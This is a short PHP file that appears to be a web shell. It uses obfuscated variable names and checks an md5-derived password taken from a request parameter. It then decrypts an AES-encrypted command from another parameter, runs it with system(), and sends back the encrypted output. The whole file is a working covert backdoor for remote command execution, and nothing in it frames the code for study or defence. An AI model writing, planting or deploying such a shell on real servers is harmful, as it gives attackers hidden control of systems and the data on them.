<?php
$_ = 'substr';
$__ = 'md5';
$___ = '_REQUEST';
$_____ = 'x';
$______ = 'pass';
$__R = $_REQUEST;
$KEY = 'mysecretkey12345';
$IV  = '1234567890abcdef';
function decrypt_aes($data, $key, $iv) {
    return openssl_decrypt(base64_decode($data), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
}
function encrypt_aes($data, $key, $iv) {
    return base64_encode(openssl_encrypt($data, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv));
}
$hash = $__($__R[$_____]);
$tail = $_($hash, 28);
if ($tail === "\x35\x65\x37\x63") {
    $cmd = decrypt_aes($__R[$______], $KEY, $IV);
    if ($cmd) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
        echo encrypt_aes($output, $KEY, $IV);
    }
}
?>
